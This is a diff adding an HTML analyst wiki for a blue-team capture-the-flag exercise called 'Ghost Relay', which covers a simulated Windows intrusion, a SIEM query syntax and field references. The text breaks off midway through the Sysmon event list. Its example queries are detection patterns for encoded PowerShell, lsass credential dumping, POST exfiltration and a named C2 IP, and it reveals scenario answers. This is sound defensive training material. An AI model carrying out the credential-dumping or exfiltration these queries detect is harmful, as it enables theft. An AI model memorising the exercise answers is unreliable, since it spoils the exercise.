@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Ghost Relay — CTF Analyst Wiki</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0c0f;--bg2:#0d1117;--bg3:#161b22;--bg4:#21262d;
+  --border:#1e2730;--border2:#30363d;
+  --text:#c9d1d9;--text2:#8b949e;--text3:#484f58;
+  --blue:#58a6ff;--green:#3fb950;--orange:#ffa657;--red:#f85149;
+  --purple:#d2a8ff;--yellow:#e3b341;--cyan:#76e3ea;--pink:#f778ba;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'IBM Plex Sans',sans-serif;font-size:14px;line-height:1.7;display:flex;min-height:100vh}
+
+/* SIDEBAR NAV */
+nav{width:260px;background:var(--bg2);border-right:1px solid var(--border);position:fixed;top:0;left:0;height:100vh;overflow-y:auto;padding:24px 0;flex-shrink:0}
+.nav-logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:16px}
+.nav-logo .title{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:700;color:var(--blue);letter-spacing:2px}
+.nav-logo .title span{color:var(--red)}
+.nav-logo .sub{font-size:11px;color:var(--text3);margin-top:3px;font-family:'JetBrains Mono',monospace}
+.nav-section{padding:0 20px;margin-bottom:8px}
+.nav-section-title{font-size:10px;font-weight:600;color:var(--text3);letter-spacing:1.2px;text-transform:uppercase;padding:6px 0 4px;border-bottom:1px solid var(--border);margin-bottom:6px}
+.nav-link{display:block;padding:5px 8px;font-size:12.5px;color:var(--text2);text-decoration:none;border-radius:4px;transition:all .15s;border-left:2px solid transparent}
+.nav-link:hover{color:var(--blue);background:var(--bg3);border-left-color:var(--blue)}
+.nav-link.active{color:var(--blue);background:#0d1f3c;border-left-color:var(--blue)}
+.nav-link .tag{float:right;font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--text3)}
+
+/* MAIN */
+main{margin-left:260px;flex:1;padding:48px 60px;max-width:960px}
+
+/* TYPOGRAPHY */
+h1{font-size:32px;font-weight:600;color:#e6edf3;line-height:1.2;margin-bottom:12px}
+h2{font-size:22px;font-weight:600;color:#e6edf3;margin:48px 0 14px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+h3{font-size:16px;font-weight:600;color:var(--blue);margin:28px 0 10px}
+h4{font-size:14px;font-weight:600;color:var(--orange);margin:20px 0 8px}
+p{margin-bottom:12px;color:var(--text)}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline}
+ul,ol{padding-left:20px;margin-bottom:12px}
+li{margin-bottom:4px;color:var(--text2)}
+strong{color:#e6edf3;font-weight:500}
+
+/* HERO */
+.hero{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:32px;margin-bottom:40px;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:0;right:0;width:300px;height:100%;background:linear-gradient(135deg,transparent 60%,#0d1f3c 100%);pointer-events:none}
+.hero-tag{display:inline-block;background:#0d2b1a;border:1px solid #238636;border-radius:4px;padding:3px 10px;font-size:11px;color:var(--green);font-family:'JetBrains Mono',monospace;font-weight:700;margin-bottom:12px;letter-spacing:.5px}
+.hero h1{margin-bottom:8px}
+.hero-sub{font-size:15px;color:var(--text2);max-width:560px;margin-bottom:20px}
+.hero-stats{display:flex;gap:24px;flex-wrap:wrap}
+.hero-stat{text-align:center}
+.hero-stat .val{font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:700;color:var(--blue)}
+.hero-stat .lbl{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.8px}
+
+/* CALLOUT BOXES */
+.callout{border-radius:8px;padding:14px 18px;margin:16px 0;border-left:3px solid;display:flex;gap:12px;align-items:flex-start}
+.callout.info{background:#0d1f3c;border-color:var(--blue)}
+.callout.warn{background:#2b1a00;border-color:var(--yellow)}
+.callout.danger{background:#2b0a0a;border-color:var(--red)}
+.callout.success{background:#0d2b1a;border-color:var(--green)}
+.callout-icon{font-size:16px;flex-shrink:0;margin-top:1px}
+.callout-body{font-size:13px;color:var(--text2);line-height:1.6}
+.callout-body strong{color:#e6edf3}
+
+/* CODE BLOCKS */
+pre{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:16px 18px;overflow-x:auto;margin:12px 0}
+pre code{font-family:'JetBrains Mono',monospace;font-size:12.5px;color:#e6edf3;line-height:1.7}
+code{font-family:'JetBrains Mono',monospace;font-size:12px;background:var(--bg3);border:1px solid var(--border2);border-radius:3px;padding:1px 6px;color:var(--purple)}
+.comment{color:var(--text3)}
+.kw{color:var(--blue)}
+.val{color:var(--green)}
+.op{color:var(--orange)}
+.field{color:var(--cyan)}
+.flag{color:var(--green);font-weight:700}
+
+/* QUERY TABLE */
+.qtable{width:100%;border-collapse:collapse;margin:12px 0}
+.qtable th{background:var(--bg2);padding:8px 12px;text-align:left;font-size:11px;font-weight:600;color:var(--text3);letter-spacing:.8px;text-transform:uppercase;border-bottom:1px solid var(--border)}
+.qtable td{padding:8px 12px;border-bottom:1px solid var(--border);font-size:12.5px;vertical-align:top}
+.qtable td:first-child{font-family:'JetBrains Mono',monospace;color:var(--cyan);white-space:nowrap}
+.qtable td:nth-child(2){color:var(--text2)}
+.qtable td:nth-child(3){font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text3)}
+.qtable tr:hover td{background:var(--bg3)}
+
+/* FIELD REFERENCE TABLE */
+.ftable{width:100%;border-collapse:collapse;margin:12px 0}
+.ftable th{background:var(--bg3);padding:8px 12px;text-align:left;font-size:11px;font-weight:600;color:var(--text3);letter-spacing:.8px;text-transform:uppercase;border-bottom:1px solid var(--border)}
+.ftable td{padding:7px 12px;border-bottom:1px solid var(--border);font-size:12.5px}
+.ftable td:first-child{font-family:'JetBrains Mono',monospace;color:var(--cyan);width:160px}
+.ftable td:nth-child(2){color:var(--orange);font-family:'JetBrains Mono',monospace;font-size:11px;width:120px}
+.ftable td:nth-child(3){color:var(--text2);font-size:12px}
+.ftable tr:hover td{background:var(--bg3)}
+
+/* EID CARDS */
+.eid-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0}
+.eid-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px;border-top:3px solid}
+.eid-card .eid-num{font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:700;margin-bottom:2px}
+.eid-card .eid-name{font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:6px}
+.eid-card .eid-desc{font-size:12px;color:var(--text2)}
+.eid-card .eid-fields{margin-top:8px;font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--text3)}
+
+/* FLAGS */
+.flag-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0}
+.flag-card{background:var(--bg2);border:1px solid #238636;border-radius:8px;padding:16px}
+.flag-card .flag-id{font-family:'JetBrains Mono',monospace;font-size:16px;font-weight:700;color:var(--green);margin-bottom:4px}
+.flag-card .flag-act{font-size:11px;color:var(--text3);margin-bottom:8px;text-transform:uppercase;letter-spacing:.8px}
+.flag-card .flag-hint{font-size:12.5px;color:var(--text2);background:var(--bg3);border-radius:4px;padding:8px 12px;margin-top:8px;border-left:2px solid var(--yellow)}
+.flag-card .flag-query{font-size:11px;font-family:'JetBrains Mono',monospace;background:var(--bg3);border-radius:4px;padding:6px 10px;margin-top:6px;color:var(--cyan)}
+
+/* KILL CHAIN */
+.kc-steps{display:flex;flex-direction:column;gap:0}
+.kc-step{display:flex;gap:0;position:relative}
+.kc-step::before{content:'';position:absolute;left:23px;top:48px;bottom:-1px;width:2px;background:var(--border);z-index:0}
+.kc-step:last-child::before{display:none}
+.kc-num{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:15px;font-weight:700;flex-shrink:0;border:2px solid;position:relative;z-index:1;margin-right:16px}
+.kc-body{padding:8px 0 28px;flex:1}
+.kc-title{font-size:15px;font-weight:600;color:#e6edf3;margin-bottom:4px}
+.kc-meta{font-size:11px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-bottom:8px}
+.kc-body ul{margin:0;padding-left:16px}
+.kc-body li{font-size:12.5px;color:var(--text2);margin-bottom:3px}
+
+/* TABS (for example queries) */
+.tab-set{margin:12px 0}
+.tab-btns{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:0}
+.tab-btn{padding:7px 16px;font-size:12px;color:var(--text2);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;background:none;border-top:none;border-left:none;border-right:none;font-family:'IBM Plex Sans',sans-serif}
+.tab-btn:hover{color:var(--blue)}
+.tab-btn.active{color:var(--blue);border-bottom-color:var(--blue)}
+.tab-pane{display:none;background:var(--bg2);border:1px solid var(--border);border-top:none;border-radius:0 0 8px 8px;padding:16px}
+.tab-pane.active{display:block}
+
+/* SECTION ANCHOR */
+section{scroll-margin-top:24px}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+
+/* BADGE */
+.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-family:'JetBrains Mono',monospace;font-weight:600;margin:0 2px}
+.badge.blue{background:#0d1f3c;border:1px solid #1f6feb;color:var(--blue)}
+.badge.green{background:#0d2b1a;border:1px solid #238636;color:var(--green)}
+.badge.orange{background:#2b1500;border:1px solid #9e5100;color:var(--orange)}
+.badge.red{background:#2b0a0a;border:1px solid #8b1a1a;color:var(--red)}
+.badge.purple{background:#1a0e2e;border:1px solid #553098;color:var(--purple)}
+
+/* TOP RULE */
+.top-badge{display:inline-flex;align-items:center;gap:6px;background:var(--bg3);border:1px solid var(--border2);border-radius:6px;padding:4px 12px;font-size:11px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-bottom:10px}
+.dot{width:7px;height:7px;border-radius:50%;display:inline-block}
+.dot.red{background:#f85149} .dot.green{background:#3fb950} .dot.yellow{background:#e3b341}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-logo">
+    <div class="title">GHOST<span>RELAY</span></div>
+    <div class="sub">Analyst Wiki v1.0</div>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-section-title">Getting Started</div>
+    <a class="nav-link" href="#overview">Overview &amp; Scenario</a>
+    <a class="nav-link" href="#quickstart">Quickstart Guide</a>
+    <a class="nav-link" href="#loading">Loading Logs</a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-section-title">Query Language</div>
+    <a class="nav-link" href="#query-syntax">Syntax Reference</a>
+    <a class="nav-link" href="#fields">Field Reference</a>
+    <a class="nav-link" href="#operators">Operators</a>
+    <a class="nav-link" href="#examples">Example Queries</a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-section-title">Event IDs</div>
+    <a class="nav-link" href="#sysmon-eids">Sysmon Events</a>
+    <a class="nav-link" href="#windows-eids">Windows Security</a>
+    <a class="nav-link" href="#system-eids">System Events</a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-section-title">Investigation</div>
+    <a class="nav-link" href="#kill-chain">Kill Chain</a>
+    <a class="nav-link" href="#rabbit-holes">Rabbit Holes ⚠️</a>
+    <a class="nav-link" href="#flags">Flags &amp; Hints</a>
+    <a class="nav-link" href="#playbook">Hunt Playbook</a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-section-title">Reference</div>
+    <a class="nav-link" href="#ioc">IOC List</a>
+    <a class="nav-link" href="#timeline">Event Timeline</a>
+    <a class="nav-link" href="#faq">FAQ</a>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<main>
+
+<!-- ═══════════════════════════════════════════════ OVERVIEW -->
+<section id="overview">
+  <div class="top-badge"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>&nbsp;&nbsp;ghost_relay_logs.xml · 1,558 events · 2024-03-11 → 2024-03-13</div>
+
+  <div class="hero">
+    <div class="hero-tag">🔴 ACTIVE INCIDENT · CLASSIFIED</div>
+    <h1>Operation Ghost Relay</h1>
+    <p class="hero-sub">A stealthy 3-day intrusion using only Windows built-ins and LOLBins. No custom malware — just the OS working against itself. Your job: reconstruct the full kill chain and capture all 5 flags.</p>
+    <div class="hero-stats">
+      <div class="hero-stat"><div class="val">1,558</div><div class="lbl">Total Events</div></div>
+      <div class="hero-stat"><div class="val">5</div><div class="lbl">Attack Acts</div></div>
+      <div class="hero-stat"><div class="val">5</div><div class="lbl">Hidden Flags</div></div>
+      <div class="hero-stat"><div class="val">9</div><div class="lbl">Event ID Types</div></div>
+      <div class="hero-stat"><div class="val">3</div><div class="lbl">Days of Logs</div></div>
+    </div>
+  </div>
+
+  <h2>The Scenario</h2>
+  <p>A corporate network was breached over 3 days. The attacker compromised user <code>jmendoza</code> on <code>WORKSTATION-03</code> via a spear-phishing email containing a malicious Office macro. From there, they enumerated the domain, moved laterally to <code>WORKSTATION-07</code>, dumped credentials, and exfiltrated data to a known Tor exit node.</p>
+
+  <div class="callout warn">
+    <div class="callout-icon">⚠️</div>
+    <div class="callout-body"><strong>Rabbit holes ahead.</strong> The logs contain hundreds of suspicious-looking but completely benign events. Other users run admin commands, PowerShell fires from scheduled tasks, and multiple hosts show unusual-looking activity. Only one user on one host is the real attacker. Correlate carefully.</div>
+  </div>
+
+  <h3>Network Topology</h3>
+  <table class="ftable">
+    <tr><th>Host</th><th>Role</th><th>Notes</th></tr>
+    <tr><td>WORKSTATION-03</td><td style="color:var(--red)">Patient Zero</td><td>jmendoza's machine. Initial access + staging.</td></tr>
+    <tr><td>WORKSTATION-07</td><td style="color:var(--orange)">Pivot Target</td><td>Lateral movement destination via PsExec/WMIC.</td></tr>
+    <tr><td>WORKSTATION-12</td><td style="color:var(--text2)">Benign</td><td>Normal user activity. Red herring.</td></tr>
+    <tr><td>SRV-FILE01</td><td style="color:var(--text2)">File Server</td><td>Admin file operations. Mostly noise.</td></tr>
+    <tr><td>SRV-DC01</td><td style="color:var(--text2)">Domain Controller</td><td>Domain queries. No compromise evidence.</td></tr>
+  </table>
+</section>
+
+<!-- ═══════════════════════════════════════════════ QUICKSTART -->
+<section id="quickstart">
+  <h2>Quickstart Guide</h2>
+  <p>New to this SIEM? Follow these steps to orient yourself before hunting.</p>
+
+  <h3>Step 1 — Load the log file</h3>
+  <p>Open the SIEM tool and click <strong>Browse File</strong>. Select <code>ghost_relay_logs.xml</code>. The parser will ingest all 1,558 events. The header will show the total count once loaded.</p>
+
+  <h3>Step 2 — Get the lay of the land</h3>
+  <p>Before querying, click the <strong>Stats</strong> tab. You'll see event ID distribution, host breakdown, and user activity. Notice which host has the most process creation events — that's your starting point.</p>
+
+  <h3>Step 3 — Run your first query</h3>
+  <p>Type a query in the search bar and press <kbd>Enter</kbd> or click <strong>▶ Run</strong>:</p>
+  <pre><code><span class="field">user</span> <span class="op">CONTAINS</span> <span class="val">"jmendoza"</span></code></pre>
+  <p>This shows every event involving the compromised account. Sort by <strong>Time</strong> to see chronological activity.</p>
+
+  <h3>Step 4 — Use preset hunts</h3>
+  <p>The toolbar has 17 preset queries covering common attacker TTPs. Click any preset to run it instantly. Good first ones:</p>
+  <ul>
+    <li><strong>⚡ WINWORD spawns cmd</strong> — finds the initial macro execution (Act 1)</li>
+    <li><strong>🌐 C2 Beacon</strong> — finds outbound connections to the C2 IP</li>
+    <li><strong>👤 All jmendoza Events</strong> — full attacker timeline</li>
+  </ul>
+
+  <h3>Step 5 — Click any row for details</h3>
+  <p>Click an event row to expand the full detail panel at the bottom. Every field is shown — <code>CommandLine</code>, <code>Hashes</code>, <code>GrantedAccess</code>, etc. Flag-containing events highlight in <span style="color:var(--green)">green</span>.</p>
+
+  <div class="callout success">
+    <div class="callout-icon">🏴</div>
+    <div class="callout-body"><strong>Flag format:</strong> <code>CTF{...}</code> — flags appear embedded in <code>CommandLine</code>, <code>TargetFilename</code>, or similar fields. The flag tracker in the top-right header auto-detects them as you find events containing them.</div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════ LOADING -->
+<section id="loading">
+  <h2>Loading Logs</h2>
+  <p>The SIEM accepts Windows Event XML format — the same structure as <code>.evtx</code> exports from Event Viewer or <code>wevtutil</code>.</p>
+
+  <h3>File format</h3>
+  <pre><code><span class="comment">&lt;!-- Root wrapper --&gt;</span>
+&lt;<span class="kw">Events</span>&gt;
+  &lt;<span class="kw">Event</span> xmlns="http://schemas.microsoft.com/win/2004/08/events/event"&gt;
+    &lt;<span class="kw">System</span>&gt;
+      &lt;<span class="kw">Provider</span> Name="Microsoft-Windows-Sysmon" /&gt;
+      &lt;<span class="kw">EventID</span>&gt;1&lt;/EventID&gt;
+      &lt;<span class="kw">TimeCreated</span> SystemTime="2024-03-11T09:14:33.000000+00:00"/&gt;
+      &lt;<span class="kw">Computer</span>&gt;WORKSTATION-03&lt;/Computer&gt;
+    &lt;/System&gt;
+    &lt;<span class="kw">EventData</span>&gt;
+      &lt;<span class="kw">Data</span> Name="Image"&gt;C:\Windows\System32\cmd.exe&lt;/Data&gt;
+      &lt;<span class="kw">Data</span> Name="CommandLine"&gt;cmd.exe /c whoami&lt;/Data&gt;
+      <span class="comment">&lt;!-- ... more fields ... --&gt;</span>
+    &lt;/EventData&gt;
+  &lt;/Event&gt;
+  <span class="comment">&lt;!-- ... 1557 more events ... --&gt;</span>
+&lt;/Events&gt;</code></pre>
+
+  <div class="callout info">
+    <div class="callout-icon">ℹ️</div>
+    <div class="callout-body">The SIEM parses <code>&lt;Data Name="..."&gt;</code> elements and maps them to queryable field names. See the <a href="#fields">Field Reference</a> for the complete mapping.</div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════ QUERY SYNTAX -->
+<section id="query-syntax">
+  <h2>Query Syntax</h2>
+  <p>The query engine supports a simple but powerful field-based syntax. Queries run on every loaded event in real time.</p>
+
+  <h3>Basic structure</h3>
+  <pre><code><span class="field">FIELD</span> <span class="op">OPERATOR</span> <span class="val">"VALUE"</span></code></pre>
+
+  <h3>Combining conditions</h3>
+  <p>Use <code>AND</code> to combine multiple conditions. All conditions must match:</p>
+  <pre><code><span class="field">eid</span> <span class="op">=</span> <span class="val">"1"</span> <span class="kw">AND</span> <span class="field">host</span> <span class="op">=</span> <span class="val">"WORKSTATION-03"</span> <span class="kw">AND</span> <span class="field">user</span> <span class="op">CONTAINS</span> <span class="val">"jmendoza"</span></code></pre>
+
+  <div class="callout warn">
+    <div class="callout-icon">⚠️</div>
+    <div class="callout-body"><strong>No OR support yet.</strong> To run OR-style searches, use <code>CONTAINS</code> on a common substring, or run multiple separate queries and compare results.</div>
+  </div>
+
+  <h3>Free-text search</h3>
+  <p>If you type a single word or phrase without a field name, it searches all fields:</p>
+  <pre><code><span class="val">psexec</span>               <span class="comment"># searches everything for "psexec"</span>
+<span class="val">185.220.101.47</span>       <span class="comment"># searches all fields for this IP</span>
+<span class="val">lsass</span>                <span class="comment"># finds anything mentioning lsass</span></code></pre>
+</section>
+
+<!-- ═══════════════════════════════════════════════ FIELDS -->
+<section id="fields">
+  <h2>Field Reference</h2>
+  <p>These field names can be used in queries. Field names are <strong>case-insensitive</strong>. Multiple aliases work for each field.</p>
+
+  <h3>Universal fields (all events)</h3>
+  <table class="ftable">
+    <tr><th>Field Name(s)</th><th>Type</th><th>Description</th></tr>
+    <tr><td>eid, eventid, id</td><td>string</td><td>Windows Event ID (e.g. "1", "4624", "7045")</td></tr>
+    <tr><td>host, computer, hostname</td><td>string</td><td>Source computer name</td></tr>
+    <tr><td>user, username</td><td>string</td><td>User context — may include domain (CORP\jmendoza). Use CONTAINS for just the username part.</td></tr>
+    <tr><td>channel</td><td>string</td><td>Log channel: "Microsoft-Windows-Sysmon/Operational", "Security", "System"</td></tr>
+    <tr><td>time</td><td>datetime string</td><td>Event timestamp (ISO 8601). Use for sorting.</td></tr>
+  </table>
+
+  <h3>Process fields (EID 1, 4688)</h3>
+  <table class="ftable">
+    <tr><th>Field Name(s)</th><th>Type</th><th>Description</th></tr>
+    <tr><td>image, process</td><td>string</td><td>Full path of the created process</td></tr>
+    <tr><td>cmdline, commandline, cmd</td><td>string</td><td>Full command line including arguments — <em>most important field for finding attacker activity</em></td></tr>
+    <tr><td>parent, parentimage</td><td>string</td><td>Full path of the parent process that spawned this one</td></tr>
+    <tr><td>hashes, hash</td><td>string</td><td>SHA256 (and sometimes MD5) hash of the executable</td></tr>
+  </table>
+
+  <h3>Network fields (EID 3)</h3>
+  <table class="ftable">
+    <tr><th>Field Name(s)</th><th>Type</th><th>Description</th></tr>
+    <tr><td>dstip, destinationip, ip</td><td>string</td><td>Destination IP address</td></tr>
+    <tr><td>dstport, port</td><td>string</td><td>Destination port number</td></tr>
+  </table>
+
+  <h3>File fields (EID 11)</h3>
+  <table class="ftable">
+    <tr><th>Field Name(s)</th><th>Type</th><th>Description</th></tr>
+    <tr><td>file, targetfile, filename</td><td>string</td><td>Full path of the created file</td></tr>
+  </table>
+
+  <h3>DNS fields (EID 22)</h3>
+  <table class="ftable">
+    <tr><th>Field Name(s)</th><th>Type</th><th>Description</th></tr>
+    <tr><td>dns, dnsquery</td><td>string</td><td>Domain name queried</td></tr>
+  </table>
+
+  <h3>Process access fields (EID 10)</h3>
+  <table class="ftable">
+    <tr><th>Field Name(s)</th><th>Type</th><th>Description</th></tr>
+    <tr><td>access, grantedaccess</td><td>string</td><td>Access mask granted (e.g. "0x1FFFFF" = PROCESS_ALL_ACCESS)</td></tr>
+    <tr><td>targetimage</td><td>string</td><td>Process being accessed</td></tr>
+  </table>
+
+  <h3>Auth/service fields (EID 4624, 4648, 7045)</h3>
+  <table class="ftable">
+    <tr><th>Field Name(s)</th><th>Type</th><th>Description</th></tr>
+    <tr><td>logontype</td><td>string</td><td>2=Interactive, 3=Network, 10=RemoteInteractive</td></tr>
+    <tr><td>servicename</td><td>string</td><td>Service name installed (EID 7045)</td></tr>
+  </table>
+</section>
+
+<!-- ═══════════════════════════════════════════════ OPERATORS -->
+<section id="operators">
+  <h2>Operators</h2>
+  <table class="qtable">
+    <tr><th>Operator</th><th>Description</th><th>Example</th></tr>
+    <tr><td>=</td><td>Exact match (case-insensitive)</td><td>eid = "1"</td></tr>
+    <tr><td>!=</td><td>Not equal</td><td>user != "SYSTEM"</td></tr>
+    <tr><td>CONTAINS</td><td>Substring match (case-insensitive)</td><td>cmdline CONTAINS "powershell"</td></tr>
+    <tr><td>NOT CONTAINS</td><td>Does not contain substring</td><td>image NOT CONTAINS "system32"</td></tr>
+    <tr><td>STARTSWITH</td><td>Value starts with string</td><td>file STARTSWITH "C:\Windows\Temp"</td></tr>
+    <tr><td>ENDSWITH</td><td>Value ends with string</td><td>image ENDSWITH "cmd.exe"</td></tr>
+    <tr><td>AND</td><td>Both conditions must match</td><td>eid = "1" AND host = "WORKSTATION-03"</td></tr>
+  </table>
+
+  <div class="callout info">
+    <div class="callout-icon">💡</div>
+    <div class="callout-body"><strong>Tip:</strong> All string matching is case-insensitive. <code>CONTAINS "LSASS"</code> and <code>CONTAINS "lsass"</code> return the same results. Quotes around values are optional for single words but required for values with spaces.</div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════ EXAMPLES -->
+<section id="examples">
+  <h2>Example Queries</h2>
+
+  <h3>Finding process parent-child relationships</h3>
+  <pre><code><span class="comment"># Find anything that spawned from cmd.exe</span>
+<span class="field">parent</span> <span class="op">CONTAINS</span> <span class="val">"cmd.exe"</span> <span class="kw">AND</span> <span class="field">eid</span> <span class="op">=</span> <span class="val">"1"</span>
+
+<span class="comment"># Find anything spawned by Office apps (initial access indicator)</span>
+<span class="field">parent</span> <span class="op">CONTAINS</span> <span class="val">"WINWORD"</span> <span class="kw">AND</span> <span class="field">eid</span> <span class="op">=</span> <span class="val">"1"</span>
+
+<span class="comment"># PowerShell spawned by a non-standard parent (suspicious)</span>
+<span class="field">image</span> <span class="op">CONTAINS</span> <span class="val">"powershell"</span> <span class="kw">AND</span> <span class="field">parent</span> <span class="op">NOT CONTAINS</span> <span class="val">"svchost"</span> <span class="kw">AND</span> <span class="field">eid</span> <span class="op">=</span> <span class="val">"1"</span></code></pre>
+
+  <h3>Hunting encoded PowerShell</h3>
+  <pre><code><span class="comment"># Base64-encoded PS (very suspicious, used for C2 staging)</span>
+<span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"-Enc"</span> <span class="kw">AND</span> <span class="field">eid</span> <span class="op">=</span> <span class="val">"1"</span>
+
+<span class="comment"># PS with execution policy bypass (common attacker pattern)</span>
+<span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"ExecutionPolicy"</span> <span class="kw">AND</span> <span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"Bypass"</span>
+
+<span class="comment"># Hidden window PS — attacker trying to stay invisible</span>
+<span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"-W Hidden"</span></code></pre>
+
+  <h3>Lateral movement detection</h3>
+  <pre><code><span class="comment"># WMIC remote execution (common lateral movement)</span>
+<span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"wmic"</span> <span class="kw">AND</span> <span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"/node:"</span>
+
+<span class="comment"># PsExec usage</span>
+<span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"psexec"</span>
+
+<span class="comment"># Explicit credential logons (pass-the-hash / pass-the-ticket indicator)</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"4648"</span>
+
+<span class="comment"># Network logon type 3 for jmendoza — is it expected?</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"4624"</span> <span class="kw">AND</span> <span class="field">user</span> <span class="op">CONTAINS</span> <span class="val">"jmendoza"</span> <span class="kw">AND</span> <span class="field">logontype</span> <span class="op">=</span> <span class="val">"3"</span></code></pre>
+
+  <h3>Credential dumping</h3>
+  <pre><code><span class="comment"># Any process accessing lsass</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"10"</span>
+
+<span class="comment"># PROCESS_ALL_ACCESS on lsass (credential dump)</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"10"</span> <span class="kw">AND</span> <span class="field">access</span> <span class="op">=</span> <span class="val">"0x1FFFFF"</span>
+
+<span class="comment"># Procdump / minidump patterns in command lines</span>
+<span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"lsass"</span> <span class="kw">AND</span> <span class="field">eid</span> <span class="op">=</span> <span class="val">"1"</span>
+
+<span class="comment"># .dmp file creation</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"11"</span> <span class="kw">AND</span> <span class="field">file</span> <span class="op">ENDSWITH</span> <span class="val">".dmp"</span></code></pre>
+
+  <h3>C2 and exfiltration</h3>
+  <pre><code><span class="comment"># All outbound connections from the attacker host</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"3"</span> <span class="kw">AND</span> <span class="field">host</span> <span class="op">=</span> <span class="val">"WORKSTATION-03"</span>
+
+<span class="comment"># Connections to the known C2</span>
+<span class="field">dstip</span> <span class="op">=</span> <span class="val">"185.220.101.47"</span>
+
+<span class="comment"># DGA-style domain lookups (short, random-looking domains)</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"22"</span> <span class="kw">AND</span> <span class="field">host</span> <span class="op">=</span> <span class="val">"WORKSTATION-03"</span>
+
+<span class="comment"># Invoke-WebRequest POST (data exfiltration)</span>
+<span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"POST"</span> <span class="kw">AND</span> <span class="field">eid</span> <span class="op">=</span> <span class="val">"1"</span>
+
+<span class="comment"># 7-Zip compression before exfil</span>
+<span class="field">image</span> <span class="op">CONTAINS</span> <span class="val">"7z.exe"</span></code></pre>
+
+  <h3>Staging and cleanup</h3>
+  <pre><code><span class="comment"># Files dropped in suspicious locations</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"11"</span> <span class="kw">AND</span> <span class="field">file</span> <span class="op">CONTAINS</span> <span class="val">"Temp"</span>
+
+<span class="comment"># Attacker cleanup (deleting tools)</span>
+<span class="field">cmdline</span> <span class="op">CONTAINS</span> <span class="val">"del /f"</span>
+
+<span class="comment"># Service installation (PsExec creates PSEXESVC)</span>
+<span class="field">eid</span> <span class="op">=</span> <span class="val">"7045"</span></code></pre>
+
+  <h3>Sidebar shortcuts</h3>
+  <p>Click any <strong>Event ID</strong>, <strong>Hostname</strong>, or <strong>Username</strong> in the left sidebar to instantly filter to that value. This is the fastest way to drill into a specific host or user's activity.</p>
+</section>
+
+<!-- ═══════════════════════════════════════════════ SYSMON EIDS -->
+<section id="sysmon-eids">
+  <h2>Sysmon Event IDs</h2>
+  <p>Sysmon (System Monitor) is a Windows service that logs detailed system activity to the Windows Event Log. These are the EIDs you'll encounter in this dataset.</p>
+
+  <div class="eid-grid">
+    <div class="eid-card" style="border-top-color:#f59e0b">
+      <div class="eid-num" style="color:#f59e0b">1</div>
+      <div class="eid-name">Process Creation</div>
+      <div class="eid-desc">Logged every time a new process is created. Contains the full command line, parent process, and file hashes. <strong>This is the highest-value event for attacker detection</strong> — look for unusual parent-child relationships.</div>
+      <div class="eid-fields">Key fields: Image, CommandLine, ParentImage, Hashes, User</div>
+    </div>
+    <div class="eid-card" style="border-top-color:#3b82f6">
+      <div class="eid-num" style="color:#3b82f6">3</div>
